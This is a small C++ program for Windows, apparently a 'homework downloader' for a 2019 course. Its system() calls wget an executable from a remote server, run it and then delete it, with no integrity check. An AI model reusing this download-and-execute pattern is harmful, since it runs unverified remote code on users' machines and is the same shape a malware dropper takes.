#include <iostream>
#include <Windows.h>
using namespace std;

int main(void){
    
    //system("echo off");
    cout << "<<< DEVSIGN 2019 C Homework Downloader >>>" << endl;
    cout << "** Connecting to update server..." << endl;
    system("wget https://habitat.factoryal.com/devsign/2019-C/updater.exe");
    system(".\\updater.exe");
    system("rm updater.exe");
    cout << "Updater will be closed in few seconds..." << endl;
    Sleep(3000);
    return 0;
}